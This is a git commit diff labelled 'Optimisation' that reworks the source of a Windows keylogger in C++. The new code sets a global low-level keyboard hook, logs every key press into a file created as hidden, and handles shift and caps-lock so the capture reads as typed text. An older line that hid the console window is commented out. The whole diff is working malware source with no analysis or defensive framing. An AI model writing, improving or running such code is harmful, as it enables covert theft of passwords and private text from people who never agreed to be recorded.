16b9c52ca6384dbda3e19c04c741d5f057b92e39
pgpgeek <dave-hill@dyrk.org>
2020-08-24 17:17:41 +0200

    Optimisation

--- main.cpp
+++ main.cpp
@@ -7,8 +7,8 @@
 *
 */
 
-#include "main.h"
 
+#include "main.h"
 /*
 *
 *   Main File
@@ -17,14 +17,33 @@
 *
 **/
 
+
 // Hook to detect Keyboard Event - Need GetMessage to Work
-LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam,LPARAM lParam){
-    int key;
-    key = getKeyPressed();
-    if (key >=32){
-        appendFile(_KEYLOG_FILENAME_, key);
-    }
-    return CallNextHookEx(NULL, code, wParam, lParam);
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
+    wchar_t title[256];
+    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
+
+     switch(wParam){
+        case VK_RETURN:
+            writeFileString(_KEYLOG_FILENAME_, "\n");
+            break;
+        case VK_CONTROL:
+        case VK_MENU :
+        case VK_DELETE:
+            break;
+        case WM_KEYDOWN :
+            // detect if shift is pressed
+            bool isShift    = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
+            // detect if capslock is enabled
+            bool isCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
+            // Convert uppercase to lowercase if needed (shift, capsLock)
+            if (((isCapslock == false && isShift == false) || (isCapslock == true && isShift == true))  && key->vkCode >=65 && key->vkCode<=90) {
+               key->vkCode = key->vkCode + 32;
+            }
+            appendFile(_KEYLOG_FILENAME_, key->vkCode);
+        break;
+     }
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
 
@@ -50,7 +69,7 @@ void createFile(char *filename, bool hidden){
 }
 
 
-// add text in file
+// add character in file
 bool appendFile(char *filename, char letter){
     FILE *pFile;
     pFile = fopen(filename, "a+");
@@ -62,30 +81,28 @@ bool appendFile(char *filename, char letter){
     return false;
 }
 
-
-// detect the pressed key
-int getKeyPressed(){
-    int key = 0;
-    for (int i = 32; i <= 90; i++) {
-        key = i;
-        if (GetAsyncKeyState(i) ==-32767) {
-            if (GetAsyncKeyState(VK_LSHIFT) !=-32767 && i >=65 && i<=90) {
-                key = i +32;
-            }
-            return key;
-        }
+// add text in file
+bool writeFileString(char *filename, char *str){
+    FILE *pFile;
+    pFile = fopen(filename, "a+");
+    if (pFile != NULL) {
+        fprintf(pFile, "%s", str);
+        fclose(pFile);
+        return true;
     }
-    return -1;
+    return false;
 }
 
 
 int main() {
     MSG msg;
     bool bRet;
-    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     createFile(_KEYLOG_FILENAME_, true);
-    FreeConsole();
-    while ((bRet = GetMessage( &msg, NULL, 0, 0 )) != 0){
+    // FreeConsole();
+    while ((bRet = GetMessage( &msg, NULL, 0, 0)) != 0){
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
     }
 }
 
--- main.h
+++ main.h
@@ -22,9 +22,8 @@
 #define _CRT_SECURE_NO_DEPRECATE
 #define _KEYLOG_FILENAME_ "keyboard.log"
 
-int getKeyPressed();
 bool appendFile(char *filename, char letter);
 bool logFileExist(char *filename);
+bool writeFileString(char *filename, char *str);
 void createFile(char *filename, bool hidden);
-
-
+HHOOK keyboardHook;
